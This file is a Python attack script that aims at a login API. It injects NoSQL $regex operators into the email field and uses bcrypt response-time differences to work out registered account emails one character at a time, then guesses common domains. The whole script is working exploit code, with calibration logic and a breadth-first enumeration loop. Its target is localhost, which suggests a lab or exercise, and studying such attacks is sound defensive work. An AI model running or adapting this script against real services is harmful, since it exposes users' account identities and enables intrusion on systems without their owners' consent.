import requests
import time
import string
import sys

TARGET = "http://localhost:5001/api/auth/login"

DOMAIN_SHORTCUTS = [
    "test.com", "example.com", "gmail.com", "debug.com",
    "mail.com", "hotmail.com", "yahoo.com", "outlook.com"
]

LOCAL_CHARSET = string.ascii_lowercase + string.digits + "._-"

def probe(prefix):
    payload = {"email": {"$regex": f"^{prefix}"}, "password": "wrongpassword"}
    start = time.monotonic()
    requests.post(TARGET, json=payload)
    return (time.monotonic() - start) * 1000

def probe_avg(prefix, samples=4):
    times = [probe(prefix) for _ in range(samples)]
    times.sort()
    # Drop highest and lowest, average the middle — reduces noise
    trimmed = times[1:-1] if len(times) >= 4 else times
    return sum(trimmed) / len(trimmed)

def calibrate():
    print("[*] Calibrating timing baseline (this takes ~10 seconds)...", flush=True)

    no_match_times = [probe("zzzzzzzzzzzzzzzzz") for _ in range(8)]
    no_match_avg = sum(no_match_times) / len(no_match_times)
    print(f"    No-match baseline: {no_match_avg:.1f}ms", flush=True)

    match_times = [probe("") for _ in range(8)]
    match_avg = sum(match_times) / len(match_times)
    print(f"    Match baseline:    {match_avg:.1f}ms", flush=True)

    gap = match_avg - no_match_avg
    if gap < 30:
        print(f"[!] WARNING: timing gap is only {gap:.1f}ms — results may be noisy", flush=True)

    # Set threshold at 80% of match_avg, not the midpoint
    # This is much more conservative — only clear bcrypt hits will pass
    threshold = no_match_avg + gap * 0.80
    print(f"[*] Threshold set to: {threshold:.1f}ms (80% of gap)\n", flush=True)
    return threshold

def is_hit(prefix, threshold):
    avg = probe_avg(prefix, samples=4)
    return avg > threshold, avg

def enumerate_emails(threshold):
    found = []
    queue = [""]
    visited = set()

    while queue:
        current = queue.pop(0)

        if current in visited:
            continue
        visited.add(current)

        # After @ found — try domain shortcuts
        if current.endswith("@"):
            local = current[:-1]
            print(f"\n[*] Local part '{local}' complete — trying domains...", flush=True)
            for domain in DOMAIN_SHORTCUTS:
                candidate = f"{local}@{domain}"
                hit, avg = is_hit(candidate, threshold)
                if hit:
                    print(f"[+] COMPLETE EMAIL: {candidate} ({avg:.1f}ms)", flush=True)
                    found.append(candidate)
                    break
            continue

        # Sanity check — if more than 8 chars hit at same depth, threshold is still too low
        hits_at_this_level = []

        for char in LOCAL_CHARSET + "@":
            candidate = current + char
            if candidate in visited:
                continue

            hit, avg = is_hit(candidate, threshold)

            if hit:
                hits_at_this_level.append((candidate, avg))
                print(f"[+] HIT: '{candidate}' ({avg:.1f}ms)", flush=True)

        # If too many hits at this level it's noise — skip this branch
        if len(hits_at_this_level) > 8:
            print(f"[!] Too many hits at prefix '{current}' ({len(hits_at_this_level)}) — skipping branch (threshold too low for this branch)", flush=True)
            continue

        for candidate, avg in hits_at_this_level:
            if candidate.endswith("@"):
                queue.insert(0, candidate)
            else:
                queue.append(candidate)

    return found

if __name__ == "__main__":
    print(f"[*] Target: {TARGET}\n", flush=True)
    threshold = calibrate()
    found = enumerate_emails(threshold)

    print("\n[*] Done.", flush=True)
    if found:
        print("[+] Discovered emails:")
        for e in found:
            print(f"    {e}")
    else:
        print("[-] No complete emails found")